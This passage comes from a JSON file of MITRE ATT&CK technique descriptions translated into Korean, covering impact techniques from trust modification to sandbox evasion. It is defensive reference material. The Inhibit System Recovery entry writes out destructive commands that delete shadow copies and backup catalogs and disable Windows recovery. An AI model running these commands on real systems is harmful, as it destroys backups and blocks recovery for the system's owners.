Domain)\n\n또한 공격자는 Okta 또는 AWS IAM Identity Center와 같은 신원 테넌트에 새로운 연합 신원 공급자를 추가할 수 있으며, 이를 통해 공격자는 테넌트의 모든 사용자로 인증할 수 있습니다. (인용: Okta Cross-Tenant Impersonation 2023) 이는 위협 행위자가 신원 테넌트를 활용하는 다양한 클라우드 기반 서비스에 광범위한 접근 권한을 얻을 수 있게 합니다. 예를 들어, AWS 환경에서 AWS 조직에 대한 새로운 신원 공급자를 생성하는 공격자는 각 구성원 계정에 대한 신원을 생성하지 않고도 모든 AWS 조직 구성원 계정으로 연합할 수 있습니다. (인용: AWS RE:Inforce Threat Detection 2024)",
      "external_id": "T1484.002",
      "modified": "2024-09-25T13:50:11.593Z",
      "title": "Trust Modification",
      "translated": true
    },
    {
      "description": "적대적 행위자는 특정 시스템이나 네트워크의 많은 수에서 데이터와 파일을 파괴하여 시스템, 서비스 및 네트워크 자원에 대한 가용성을 방해할 수 있습니다. 데이터 파괴는 저장된 데이터를 포렌식 기법으로 복구 불가능하게 만들 수 있으며, 이는 파일이나 데이터를 지역 및 원격 드라이브에서 덮어쓰는 방식으로 이루어집니다. 일반적인 운영 체제 파일 삭제 명령인 `<code>del</code>` 및 `<code>rm</code>`는 종종 파일의 내용을 삭제하지 않고 파일에 대한 포인터만 제거하므로, 적절한 포렌식 방법론을 통해 파일 복구가 가능합니다. 이 행동은 개별 파일이 파괴되는 것이기 때문에 [디스크 내용 지우기](https://attack.mitre.org/techniques/T1561/001) 및 [디스크 구조 지우기](https://attack.mitre.org/techniques/T1561/002)와는 다릅니다.\n\n적대적 행위자는 무작위로 생성된 데이터로 파일과 디렉토리를 덮어쓰려고 시도할 수 있으며, 이로 인해 복구가 불가능하게 됩니다. 경우에 따라 정치적 성향을 가진 이미지 파일이 데이터 덮어쓰기에 사용되기도 합니다.\n\n네트워크 전반에 걸쳐 가용성 중단을 목표로 하는 작전에서 목표 조직에 미치는 영향을 극대화하기 위해 데이터 파괴를 위한 악성 코드는 [유효 계정](https://attack.mitre.org/techniques/T1078), [운영 체제 자격 증명 덤핑](https://attack.mitre.org/techniques/T1003), [SMB/Windows 관리 공유](https://attack.mitre.org/techniques/T1021/002)와 같은 추가 기법을 활용하여 네트워크를 통해 전파되는 웜과 유사한 기능을 가질 수 있습니다.\n\n클라우드 환경에서는 적대적 행위자가 클라우드 저장소 객체, 머신 이미지, 데이터베이스 인스턴스 및 운영에 중요한 기타 인프라를 삭제하여 조직이나 그 고객에게 피해를 줄 수 있습니다.",
      "external_id": "T1485",
      "modified": "2024-09-25T20:46:14.641Z",
      "title": "Data Destruction",
      "translated": true
    },
    {
      "description": "적대자들은 클라우드 저장소 버킷의 생애 주기 정책을 수정하여 저장된 모든 객체를 삭제할 수 있습니다.\n\n클라우드 저장소 버킷은 종종 사용자가 일정 기간 후 객체의 마이그레이션, 아카이빙 또는 삭제를 자동화하는 생애 주기 정책을 설정할 수 있도록 허용합니다. (인용: AWS 스토리지 생애 주기) (인용: GCP 스토리지 생애 주기) (인용: Azure 스토리지 생애 주기) 위협 행위자가 이러한 정책을 수정할 수 있는 충분한 권한을 갖고 있다면, 한 번에 모든 객체를 삭제할 수 있습니다.\n\n예를 들어, AWS 환경에서는 `PutLifecycleConfiguration` 권한을 가진 적대자가 `PutBucketLifecycle` API 호출을 사용하여 S3 버킷에 대해 생애 주기 정책을 적용하여 버킷 내의 모든 객체를 하루 후에 삭제할 수 있습니다. (인용: Palo Alto 클라우드 랜섬웨어) 적대자들은 데이터를 파괴하여 강탈 및 [재정적 도난](https://attack.mitre.org/techniques/T1657)을 목적으로 이 작업을 수행할 수 있을 뿐만 아니라, [지표 제거](https://attack.mitre.org/techniques/T1070)를 위한 클라우드 로그를 저장하는 버킷에서도 이 작업을 수행할 수 있습니다. (인용: Datadog S3 생애 주기 CloudTrail 로그)",
      "external_id": "T1485.001",
      "modified": "2024-10-16T21:27:02.481Z",
      "title": "Lifecycle-Triggered Deletion",
      "translated": true
    },
    {
      "description": "공격자는 시스템이나 네트워크 리소스에 대한 가용성을 방해하기 위해 목표 시스템이나 네트워크의 다수의 시스템에서 데이터를 암호화할 수 있습니다. 그들은 파일이나 데이터를 로컬 및 원격 드라이브에 암호화하고 복호화 키에 대한 접근을 제한하여 저장된 데이터를 접근할 수 없도록 만들려고 할 수 있습니다. 이는 희생자로부터 금전적 보상을 추출하기 위해서(랜섬웨어의 경우) 또는 키가 저장되거나 전송되지 않은 경우 데이터를 영구적으로 접근할 수 없도록 만들기 위해 수행될 수 있습니다. (출처: US-CERT 랜섬웨어 2016)(출처: FireEye 워너크라이 2017)(출처: US-CERT 넷페야 2017)(출처: US-CERT 샘샘 2018)\n\n랜섬웨어의 경우, 일반적인 사용자 파일인 오피스 문서, PDF, 이미지, 비디오, 오디오, 텍스트 및 소스 코드 파일이 암호화되는 것이 일반적입니다(그리고 종종 이름이 변경되거나 특정 파일 마커가 태그됩니다). 공격자는 이러한 파일을 잠금 해제하거나 조작하기 위해 먼저 [파일 및 디렉토리 권한 수정](https://attack.mitre.org/techniques/T1222) 또는 [시스템 종료/재부팅](https://attack.mitre.org/techniques/T1529)과 같은 다른 행동을 수행해야 할 수도 있습니다. (출처: CarbonBlack 컨티 2020년 7월) 경우에 따라 공격자는 중요 시스템 파일, 디스크 파티션 및 MBR을 암호화할 수 있습니다. (출처: US-CERT 넷페야 2017)\n\n목표 조직에 대한 영향을 극대화하기 위해, 데이터를 암호화하도록 설계된 맬웨어는 [유효 계정](https://attack.mitre.org/techniques/T1078), [운영 체제 자격 증명 덤핑](https://attack.mitre.org/techniques/T1003), [SMB/윈도우 관리 공유](https://attack.mitre.org/techniques/T1021/002)와 같은 다른 공격 기술을 활용하여 네트워크에서 전파할 수 있는 웜과 같은 기능을 가질 수 있습니다. (출처: FireEye 워너크라이 2017)(출처: US-CERT 넷페야 2017) 암호화 맬웨어는 또한 피해자의 바탕화면을 변경하는 등의 [내부 변조](https://attack.mitre.org/techniques/T1491/001)를 활용하거나 피해자에게 랜섬 노트나 연결된 프린터에 메시지를 보내서(이것은 '프린트 폭격'으로 알려짐) 피해자를 위협할 수도 있습니다. (출처: NHS 디지털 이그레고르 2020년 11월)\n\n클라우드 환경에서는 침해된 계정 내의 저장 객체가 암호화될 수도 있습니다. (출처: 라이노 S3 랜섬웨어 1부)",
      "external_id": "T1486",
      "modified": "2022-06-16T13:07:10.318Z",
      "title": "Data Encrypted for Impact",
      "translated": true
    },
    {
      "description": "공격자는 시스템을 부팅하는 데 필요한 하드 드라이브의 데이터 구조를 손상시키거나 삭제할 수 있습니다. 이는 특정 중요 시스템뿐만 아니라 네트워크 내의 많은 시스템을 대상으로 하여 시스템 및 네트워크 자원의 가용성을 중단시키는 것을 목표로 합니다.\n\n공격자는 마스터 부트 레코드(MBR) 또는 파티션 테이블과 같은 구조에 위치한 중요한 데이터를 덮어씌워 시스템이 부팅할 수 없도록 만들려고 할 수 있습니다. (출처: Symantec Shamoon 2012)(출처: FireEye Shamoon Nov 2016)(출처: Palo Alto Shamoon Nov 2016)(출처: Kaspersky StoneDrill 2017)(출처: Unit 42 Shamoon3 2018) 디스크 구조에 포함된 데이터에는 운영 체제를 불러오기 위한 초기 실행 코드나 디스크의 파일 시스템 파티션 위치가 포함될 수 있습니다. 이 정보가 없다면 컴퓨터는 부팅 과정에서 운영 체제를 로드할 수 없어 사용할 수 없게 됩니다. [디스크 구조 삭제](https://attack.mitre.org/techniques/T1487)는 독립적으로 수행될 수도 있으며, 모든 섹터가 삭제될 경우 [디스크 내용 삭제](https://attack.mitre.org/techniques/T1488)와 함께 발생할 수 있습니다.\n\n목표 조직에 미치는 영향을 극대화하기 위해, 디스크 구조를 파괴하기 위해 설계된 맬웨어는 [유효 계정](https://attack.mitre.org/techniques/T1078), [OS 자격 증명 덤핑](https://attack.mitre.org/techniques/T1003), [Windows 관리자 공유](https://attack.mitre.org/techniques/T1077)와 같은 다른 기술을 활용하여 네트워크를 통해 전파되는 웜과 같은 기능을 가질 수 있습니다. (출처: Symantec Shamoon 2012)(출처: FireEye Shamoon Nov 2016)(출처: Palo Alto Shamoon Nov 2016)(출처: Kaspersky StoneDrill 2017)",
      "external_id": "T1487",
      "modified": "2020-02-20T22:11:00.106Z",
      "title": "Disk Structure Wipe",
      "translated": true
    },
    {
      "description": "공격자는 특정 시스템 및 네트워크의 많은 시스템에서 저장 장치의 내용을 삭제하여 시스템 및 네트워크 자원의 가용성을 방해할 수 있습니다.\n\n공격자는 저장 장치의 내용을 부분적으로 또는 완전히 덮어써서 저장 인터페이스를 통해 데이터를 복구할 수 없게 만듭니다. (출처: Novetta Blockbuster) (출처: Novetta Blockbuster 파괴적 맬웨어) (출처: DOJ 라자루스 소니 2018) 특정 디스크 구조나 파일을 삭제하는 대신, 파괴적 의도를 가진 공격자는 임의의 디스크 콘텐츠의 일부를 삭제할 수 있습니다. 디스크 콘텐츠를 삭제하기 위해 공격자는 하드 드라이브에 직접 접근하여 임의 크기의 디스크 부분을 랜덤 데이터로 덮어쓸 수 있습니다. (출처: Novetta Blockbuster 파괴적 맬웨어) 공격자는 [RawDisk](https://attack.mitre.org/software/S0364)와 같은 제3자 드라이버를 활용하여 디스크 콘텐츠에 직접 접근하는 사례가 관찰되었습니다. (출처: Novetta Blockbuster) (출처: Novetta Blockbuster 파괴적 맬웨어) 이러한 행동은 [데이터 파괴](https://attack.mitre.org/techniques/T1485)와는 차별되며, 삭제되는 것은 개별 파일이 아닌 디스크의 섹션입니다.\n\n네트워크 전반의 가용성 중단을 목표로 하는 작전에서 목표 조직에 대한 영향을 극대화하기 위해, 디스크 콘텐츠를 삭제하는 데 사용되는 맬웨어는 [유효 계정](https://attack.mitre.org/techniques/T1078), [운영 체제 자격 증명 덤프](https://attack.mitre.org/techniques/T1003), [Windows 관리자 공유](https://attack.mitre.org/techniques/T1077)와 같은 추가 기술을 활용하여 네트워크를 통해 전파될 수 있는 웜과 같은 기능을 가질 수 있습니다. (출처: Novetta Blockbuster 파괴적 맬웨어)",
      "external_id": "T1488",
      "modified": "2020-02-20T22:07:27.495Z",
      "title": "Disk Content Wipe",
      "translated": true
    },
    {
      "description": "적대 세력은 시스템의 서비스를 중지하거나 비활성화하여 해당 서비스를 정당한 사용자에게서 사용할 수 없도록 만들 수 있습니다. 중요한 서비스나 프로세스를 중지하면 사건에 대한 대응이 방해받거나 중단될 수 있으며, 적대 세력이 환경에 피해를 주기 위한 전반적인 목표를 지원할 수 있습니다. (출처: Talos Olympic Destroyer 2018)(출처: Novetta Blockbuster)\n\n적대 세력은 조직에 매우 중요한 개별 서비스를 비활성화함으로써 이를 달성할 수 있습니다. 예를 들어, <code>MSExchangeIS</code>를 비활성화하면 Exchange 콘텐츠에 접근할 수 없게 됩니다. (출처: Novetta Blockbuster) 경우에 따라 적대 세력은 시스템을 사용할 수 없게 만들기 위해 많은 서비스 또는 모든 서비스를 중지하거나 비활성화할 수 있습니다. (출처: Talos Olympic Destroyer 2018) 서비스나 프로세스는 실행 중에는 데이터 저장소의 수정을 허용하지 않을 수 있습니다. 적대 세력은 데이터를 파괴하기 위해 [데이터 파괴](https://attack.mitre.org/techniques/T1485)나 [영향을 위한 데이터 암호화](https://attack.mitre.org/techniques/T1486)를 수행하기 위해 Exchange 및 SQL Server와 같은 서비스의 데이터 저장소에서 서비스를 중지하거나 프로세스를 중단할 수 있습니다. (출처: SecureWorks WannaCry 분석)",
      "external_id": "T1489",
      "modified": "2024-10-12T15:57:27.380Z",
      "title": "Service Stop",
      "translated": true
    },
    {
      "description": "적대자는 복구를 방해하기 위해 손상된 시스템의 복구를 돕도록 설계된 내장 데이터를 삭제하거나 제거하고 서비스를 종료할 수 있습니다. 이로 인해 사용 가능한 백업 및 복구 옵션에 대한 접근이 거부될 수 있습니다. \n\n운영 체제에는 백업 카탈로그, 볼륨 섀도 복사본, 자동 복구 기능과 같은 손상된 시스템을 수정하는 데 도움이 될 수 있는 기능이 포함되어 있을 수 있습니다. 적대자는 시스템 복구 기능을 비활성화하거나 삭제하여 [데이터 파괴](https://attack.mitre.org/techniques/T1485) 및 [영향을 위한 데이터 암호화](https://attack.mitre.org/techniques/T1486)의 효과를 증가시킬 수 있습니다. 또한, 적대자는 복구 알림을 비활성화한 다음 백업을 손상시킬 수 있습니다.\n\n여러 가지 기본 Windows 유틸리티가 적대자에 의해 시스템 복구 기능을 비활성화하거나 삭제하는 데 사용되었습니다:\n\n* <code>vssadmin.exe</code>는 시스템의 모든 볼륨 섀도 복사본을 삭제하는 데 사용될 수 있습니다 - <code>vssadmin.exe delete shadows /all /quiet</code>\n* [Windows 관리 도구](https://attack.mitre.org/techniques/T1047)는 볼륨 섀도 복사본을 삭제하는 데 사용될 수 있습니다 - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code>는 Windows 백업 카탈로그를 삭제하는 데 사용될 수 있습니다 - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code>는 부팅 구성 데이터를 수정하여 자동 Windows 복구 기능을 비활성화하는 데 사용될 수 있습니다 - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>\n* <code>REAgentC.exe</code>는 감염된 시스템의 Windows 복구 환경(WinRE) 수리/복구 옵션을 비활성화하는 데 사용될 수 있습니다.\n* <code>diskshadow.exe</code>는 시스템의 모든 볼륨 섀도 복사본을 삭제하는 데 사용될 수 있습니다 - <code>diskshadow delete shadows all</code> \n\n네트워크 장치에 대해 적대자는 [디스크 삭제](https://attack.mitre.org/techniques/T1561)를 활용하여 백업 펌웨어 이미지를 삭제하고 파일 시스템을 포맷한 다음 [시스템 종료/재부팅](https://attack.mitre.org/techniques/T1529)을 통해 장치를 다시 로드할 수 있습니다. 이러한 활동은 네트워크 장치를 완전히 작동 불능 상태로 만들고 복구 작업을 방해할 수 있습니다.\n\n적대자는 또한 네트워크에 연결된 “온라인” 백업을 삭제할 수 있습니다. 이는 네트워크 저장 매체 또는 클라우드 서비스에 동기화되는 폴더를 통해 이루어질 수 있습니다. 클라우드 환경에서는 적대자가 버전 관리 및 백업 정책을 비활성화하고 스냅샷, 데이터베이스 백업, 머신 이미지, 재해 복구 시나리오에 사용되는 이전 버전의 객체를 삭제할 수 있습니다.",
      "external_id": "T1490",
      "modified": "2024-09-24T13:27:31.881Z",
      "title": "Inhibit System Recovery",
      "translated": true
    },
    {
      "description": "적대 세력은 기업 네트워크 내부 또는 외부에서 사용할 수 있는 시각적 콘텐츠를 수정하여 원래 콘텐츠의 무결성에 영향을 줄 수 있습니다. [낙서(Defacement)](https://attack.mitre.org/techniques/T1491)의 이유에는 메시지 전달, 위협, 또는 (아마도 거짓으로) 침입에 대한 공적 주장이 포함됩니다. 불쾌하거나 불쾌감을 주는 이미지는 사용자에게 불편함을 초래하거나 동반되는 메시지에 대한 준수를 압박하기 위해 [낙서(Defacement)](https://attack.mitre.org/techniques/T1491)의 일환으로 사용될 수 있습니다.",
      "external_id": "T1491",
      "modified": "2022-03-25T19:34:42.056Z",
      "title": "Defacement",
      "translated": true
    },
    {
      "description": "적대자는 조직 내부의 시스템을 훼손하여 사용자를 위협하거나 오도하려 할 수 있으며, 이는 시스템의 신뢰성을 훼손하는 결과를 초래합니다. 이는 내부 웹사이트의 수정이나 사용자 시스템의 바탕화면 배경화를 변경하는 형태로 이루어질 수 있습니다. [내부 훼손](https://attack.mitre.org/techniques/T1491/001)의 일환으로 불쾌하거나 외설적인 이미지가 사용될 수 있으며, 이는 사용자의 불편함을 초래하거나 동반된 메시지에 대한 준수를 압박하기 위한 목적입니다. 내부 시스템을 훼손하는 행위는 적대자의 존재를 노출시키기 때문에, 보통 다른 침투 목표가 달성된 이후에 이루어집니다.",
      "external_id": "T1491.001",
      "modified": "2022-07-28T18:55:35.988Z",
      "title": "Internal Defacement",
      "translated": true
    },
    {
      "description": "적대자는 조직 외부의 시스템을 변조하여 메시지를 전달하거나, 위협하거나, 조직이나 사용자에게 오도하기 위해 시도할 수 있습니다. [외부 변조(External Defacement)](https://attack.mitre.org/techniques/T1491/002)는 궁극적으로 사용자들이 시스템을 신뢰하지 않게 만들고 시스템의 무결성을 의심하거나 불신하게 만들 수 있습니다. 외부에서 접근 가능한 웹사이트는 자주 변조의 피해자가 되며, 정치적 메시지를 전파하거나 선전을 퍼뜨리기 위해 적대자와 해커 집단의 주요 대상이 됩니다. (출처: FireEye Cyber Threats to Media Industries) (출처: Kevin Mandia Statement to US Senate Committee on Intelligence) (출처: Anonymous Hackers Deface Russian Govt Site) [외부 변조(External Defacement)](https://attack.mitre.org/techniques/T1491/002)는 사건을 촉발하는 촉매로 사용될 수 있으며, 조직이나 정부의 행동에 대한 대응으로도 사용될 수 있습니다. 마찬가지로 웹사이트 변조는 [드라이브바이 침해(Drive-by Compromise)](https://attack.mitre.org/techniques/T1189)와 같은 향후 공격을 위한 준비 단계 또는 전조로 사용될 수도 있습니다. (출처: Trend Micro Deep Dive Into Defacement)",
      "external_id": "T1491.002",
      "modified": "2022-03-25T19:34:37.539Z",
      "title": "External Defacement",
      "translated": true
    },
    {
      "description": "적대 세력은 외부 결과를 조작하거나 활동을 숨기기 위해 데이터 저장소에 삽입, 삭제 또는 조작을 할 수 있습니다. (출처: FireEye APT38 2018년 10월) (출처: DOJ Lazarus Sony 2018) 저장된 데이터를 조작함으로써 적대 세력은 비즈니스 프로세스, 조직 이해 및 의사 결정에 영향을 미치려 할 수 있습니다.\n\n저장된 데이터는 Office 파일, 데이터베이스, 저장된 이메일, 사용자 정의 파일 형식 등 다양한 파일 형식을 포함할 수 있습니다. 수정의 유형과 그로 인한 영향은 데이터의 종류와 적대 세력의 목표 및 목적에 따라 달라집니다. 복잡한 시스템의 경우, 적대 세력은 특별한 전문 지식이 필요할 가능성이 높으며, 일반적으로 그 시스템과 관련된 전문 소프트웨어에 대한 접근이 필요할 수 있습니다. 이를 위해서는 종종 장기간의 정보 수집 캠페인이 필요합니다.",
      "external_id": "T1492",
      "modified": "2020-03-02T14:24:26.780Z",
      "title": "Stored Data Manipulation",
      "translated": true
    },
    {
      "description": "적대자는 저장소나 다른 시스템으로 가는 데이터 전송 경로를 변경하여 외부 결과를 조작하거나 활동을 숨길 수 있습니다.(출처: FireEye APT38 2018년 10월)(출처: DOJ Lazarus Sony 2018) 전송된 데이터를 조작함으로써, 적대자는 비즈니스 프로세스, 조직의 이해 및 의사 결정에 영향을 미치려고 할 수 있습니다.\n\n조작은 네트워크 연결을 통해 또는 시스템 프로세스 간에 정보가 가로채지고 변경될 수 있는 도구를 배치할 수 있는 기회가 있을 때 가능할 수 있습니다. 수정의 유형과 그로 인한 영향은 목표 전송 메커니즘뿐만 아니라 적대자의 목표와 목적에 따라 다릅니다. 복잡한 시스템의 경우, 적대자는 원하는 영향을 미치기 위해 시스템과 관련된 전문 소프트웨어에 대한 접근권을 확보하고, 이를 일반적으로는 장기적인 정보 수집 캠페인을 통해 얻어야 할 수도 있습니다.",
      "external_id": "T1493",
      "modified": "2020-03-02T14:27:49.110Z",
      "title": "Transmitted Data Manipulation",
      "translated": true
    },
    {
      "description": "적대자는 시스템을 수정하여 최종 사용자가 접근하고 표시하는 데이터에 영향을 줄 수 있습니다. (출처: FireEye APT38 2018년 10월) (출처: DOJ Lazarus Sony 2018) 런타임 데이터를 조작함으로써, 적대자는 비즈니스 프로세스, 조직의 이해, 그리고 의사 결정에 영향을 미치려 할 수 있습니다.\n\n적대자는 데이터를 표시하는 데 사용되는 애플리케이션 이진 파일을 변경하여 런타임 조작을 일으킬 수 있습니다. 또한, 적대자는 [기본 파일 연결 변경](https://attack.mitre.org/techniques/T1042) 및 [위장](https://attack.mitre.org/techniques/T1036) 기법을 사용하여 유사한 효과를 유도할 수 있습니다. 수정의 유형과 그로 인해 발생하는 영향은 목표 애플리케이션과 프로세스, 그리고 적대자의 목표 및 목적에 따라 달라집니다. 복잡한 시스템의 경우, 적대자는 원하는 영향을 미치기 위해 시스템과 관련된 특수 소프트웨어에 대한 접근과 특별한 전문 지식이 필요할 수 있으며, 이는 일반적으로 장기적인 정보 수집 캠페인을 통해 얻어집니다.",
      "external_id": "T1494",
      "modified": "2020-03-02T14:30:49.400Z",
      "title": "Runtime Data Manipulation",
      "translated": true
    },
    {
      "description": "적대자는 시스템에 연결된 장치의 BIOS 또는 기타 펌웨어의 플래시 메모리 내용을 덮어쓰거나 손상시켜 장치를 작동 불능 상태로 만들거나 부팅할 수 없게 할 수 있습니다. 이로 인해 장치 및/또는 시스템의 사용이 불가능해집니다.(출처: Symantec Chernobyl W95.CIH) 펌웨어는 하드웨어 장치의 비휘발성 메모리에서 로드되고 실행되는 소프트웨어로, 장치의 기능을 초기화하고 관리하는 데 사용됩니다. 이러한 장치에는 마더보드, 하드 드라이브 또는 비디오 카드가 포함될 수 있습니다.\n\n일반적으로 적대자는 시스템이나 장치의 사용을 거부하기 위해 펌웨어를 조작, 덮어쓰기 또는 손상시킬 수 있습니다. 예를 들어, 네트워크 장치를 위한 운영 체제를 로드하는 펌웨어의 손상은 네트워크 장치를 작동 불능 상태로 만들 수 있습니다.(출처: dhs_threat_to_net_devices)(출처: cisa_malware_orgs_ukraine) 장치에 따라 이 공격은 [데이터 파괴](https://attack.mitre.org/techniques/T1485)로 이어질 수도 있습니다.",
      "external_id": "T1495",
      "modified": "2022-08-31T17:30:05.440Z",
      "title": "Firmware Corruption",
      "translated": true
    },
    {
      "description": "적대자는 공동으로 활용된 시스템의 자원을 이용하여 리소스 집약적인 작업을 완료함으로써 시스템 또는 호스팅 서비스의 가용성에 영향을 미칠 수 있습니다.\n\n리소스 탈취는 여러 형태로 나타날 수 있습니다. 예를 들어, 적대자는 다음과 같은 방법을 사용할 수 있습니다:\n\n* 암호 화폐 채굴을 위한 컴퓨팅 자원 활용\n* 프록시 네트워크에 네트워크 대역폭 판매\n* 이익을 위해 SMS 트래픽 생성\n* 대량의 스팸 메시지를 전송하기 위해 클라우드 기반 메시징 서비스 남용\n\n일부 경우, 적대자는 동시에 여러 유형의 리소스 탈취를 이용할 수 있습니다. (출처: Sysdig Cryptojacking Proxyjacking 2023)",
      "external_id": "T1496",
      "modified": "2024-10-13T17:00:09.759Z",
      "title": "Resource Hijacking",
      "translated": true
    },
    {
      "description": "공격자는 자원 집약적인 작업을 완료하기 위해 탈취된 시스템의 컴퓨팅 자원을 활용할 수 있으며, 이는 시스템 및/또는 호스팅 서비스의 가용성에 영향을 미칠 수 있습니다.\n\n[컴퓨트 하이재킹](https://attack.mitre.org/techniques/T1496/001)의 일반적인 목적 중 하나는 암호화폐 네트워크의 거래를 검증하고 가상 화폐를 얻는 것입니다. 공격자는 충분한 시스템 자원을 소모하여 피해를 입은 머신이 부정적인 영향을 받거나 응답하지 않도록 만들 수 있습니다. (출처: Kaspersky Lazarus Under The Hood 블로그 2017) 서버와 클라우드 기반 시스템은 사용 가능한 자원이 많기 때문에 일반적인 표적이지만, 사용자 엔드포인트 시스템도 손상되어 [컴퓨트 하이재킹](https://attack.mitre.org/techniques/T1496/001) 및 암호화폐 채굴에 사용될 수 있습니다. (출처: CloudSploit - 사용되지 않는 AWS 리전) 또한, 컨테이너화된 환경은 노출된 API를 통한 배포의 용이성과 환경이나 클러스터 내 여러 컨테이너를 배포하거나 손상시켜 채굴 활동을 확장할 수 있는 가능성 때문에 표적이 될 수 있습니다. (출처: Unit 42 Hildegard 맬웨어)(출처: Trend Micro Exposed Docker APIs)\n\n추가적으로, 일부 암호화폐 채굴 맬웨어는 자원을 경쟁하지 않도록 하기 위해 경쟁하는 맬웨어의 프로세스를 식별하고 종료합니다. (출처: Trend Micro War of Crypto Miners)",
      "external_id": "T1496.001",
      "modified": "2024-10-13T16:58:38.820Z",
      "title": "Compute Hijacking",
      "translated": true
    },
    {
      "description": "적대자는 강탈한 시스템의 네트워크 대역폭 자원을 활용하여 리소스 집약적인 작업을 완료할 수 있으며, 이는 시스템 및/또는 호스팅된 서비스의 가용성에 영향을 미칠 수 있습니다.\n\n또한, 적대자는 시스템의 네트워크 대역폭을 악용하는 악성 소프트웨어를 사용하여 봇넷의 일부로서 [네트워크 서비스 거부](https://attack.mitre.org/techniques/T1498) 캠페인을 촉진하거나 악성 토렌트를 퍼뜨릴 수 있습니다.(출처: GoBotKR) 또는 피해자의 네트워크 대역폭과 IP 주소를 프록시웨어 서비스에 판매하는 프록시재킹에 참여할 수 있습니다.(출처: Sysdig Proxyjacking) 마지막으로, 추가적인 타겟을 식별하기 위해 인터넷 전반에 대한 스캔을 수행할 수도 있습니다.(출처: Unit 42 Leaked Environment Variables 2024)\n\n이 기술로 인해 잠재적인 재정적 비용이나 가용성 중단이 발생할 수 있을 뿐만 아니라, 피해자의 대역폭이 불법적인 활동에 사용될 경우 평판 손상도 초래할 수 있습니다.(출처: Sysdig Proxyjacking)",
      "external_id": "T1496.002",
      "modified": "2024-09-25T14:59:35.287Z",
      "title": "Bandwidth Hijacking",
      "translated": true
    },
    {
      "description": "적대자는 SMS 펌핑을 위해 메시징 서비스를 활용할 수 있으며, 이는 시스템 및/또는 호스팅 서비스의 가용성에 영향을 미칠 수 있습니다. (인용: Twilio SMS Pumping) SMS 펌핑은 통신 사기가 일종으로, 위협 행위자가 먼저 통신 제공업체로부터 전화번호 집합을 얻은 후, 피해자의 메시징 인프라를 이용하여 해당 집합의 번호로 대량의 SMS 메시지를 전송하는 방법입니다. 자신의 전화번호 집합으로 SMS 트래픽을 생성함으로써, 위협 행위자는 통신 제공업체로부터 지불금을 얻을 수 있습니다. (인용: Twilio SMS Pumping Fraud)\n\n위협 행위자는 종종 SMS 트래픽을 생성하기 위해 외부에 공개된 웹 양식, 예를 들어 일회용 비밀번호(OTP) 또는 계정 확인 필드를 사용합니다. 이러한 필드는 백그라운드에서 Twilio, AWS SNS 및 Amazon Cognito와 같은 서비스를 활용할 수 있습니다. (인용: Twilio SMS Pumping)(인용: AWS RE:Inforce Threat Detection 2024) 대량의 요청에 대한 응답으로 SMS 비용이 증가하고 통신 채널이 과부하에 걸릴 수 있습니다. (인용: Twilio SMS Pumping)",
      "external_id": "T1496.003",
      "modified": "2024-10-16T17:45:14.210Z",
      "title": "SMS Pumping",
      "translated": true
    },
    {
      "description": "적대자들은 자원이 많이 소모되는 작업을 완료하기 위해 손상된 소프트웨어-서비스(SaaS) 애플리케이션을 활용할 수 있으며, 이는 호스팅 서비스의 가용성에 영향을 미칠 수 있습니다.\n\n예를 들어, 적대자들은 AWS 간단 이메일 서비스(SES), AWS 간단 알림 서비스(SNS), SendGrid 및 Twilio와 같은 이메일 및 메시징 서비스를 활용하여 대량의 스팸/피싱 이메일과 SMS 메시지를 전송할 수 있습니다. (출처: Invictus IR DangerDev 2024)(출처: Permiso SES Abuse 2023)(출처: SentinelLabs SNS Sender 2024) 또는, 그들은 리버스 프록시를 활용하여 클라우드 호스팅 AI 모델의 힘을 탈취하는 LLMJacking에 참여할 수 있습니다. (출처: Sysdig LLMJacking 2024)(출처: Lacework LLMJacking 2024)\n\n일부 경우, 적대자들은 피해자가 이미 사용하고 있는 서비스를 활용할 수 있습니다. 다른 경우, 특히 서비스가 더 큰 클라우드 플랫폼의 일부인 경우, 그들은 먼저 서비스를 활성화할 수 있습니다. (출처: Sysdig LLMJacking 2024) SaaS 애플리케이션을 활용하는 것은 피해자가 상당한 재정 비용을 발생시키고, 서비스 할당량을 소모하며, 가용성에 다른 영향을 줄 수 있습니다.",
      "external_id": "T1496.004",
      "modified": "2024-10-16T17:59:27.535Z",
      "title": "Cloud Service Hijacking",
      "translated": true
    },
    {
      "description": "적대자는 가상화 및 분석 환경을 탐지하고 회피하기 위해 다양한 수단을 사용할 수 있습니다. 여기에는 가상 머신 환경(VME)이나 샌드박스를 나타내는 아티팩트의 존재를 확인하는 결과에 따라 행동을 변경하는 것이 포함될 수 있습니다. 적대자가 VME를 감지하면, 그들은 피해자로부터 이탈하거나 임플란트의 핵심 기능을 은폐하기 위해 악성 코드를 수정할 수 있습니다. 또한, 그들은 보조 또는 추가 페이로드를 투하하기 전에 VME 아티팩트를 검색할 수 있습니다. 적대자는 자동화된 발견 과정에서 [가상화/샌드박스 회피](https://attack.mitre.org/techniques/T1497)에서 얻은 정보를 사용하여 후속 행동을 형성할 수 있습니다. (출처: Deloitte Environment Awareness)\n\n적대자는 보안 모니터링 도구(예: Sysinternals, Wireshark 등) 또는 분석 또는 가상화와 관련된 다른 시스템 아티팩트를 확인하는 등 [가상화/샌드박스 회피](https://attack.mitre.org/techniques/T1497)를 수행하기 위해 여러 방법을 사용할 수 있습니다. 또한, 적대자는 분석 환경에 있는지 확인하기 위해 합법적인 사용자 활동을 확인할 수 있습니다. 추가 방법으로는 악성 코드 내에서 작동하는 동안 일시적인 샌드박스 내에서 작동하지 않도록 수면 타이머나 루프를 사용하는 것이 있습니다. (출처: Unit 42 Pirpi July 2015)",
      "external_id": "T1497",
      "modified": "2024-09-12T15:50:18.049Z",
      "title": "Virtualization/Sandbox Evasion",
      "translated": true
    },
    {
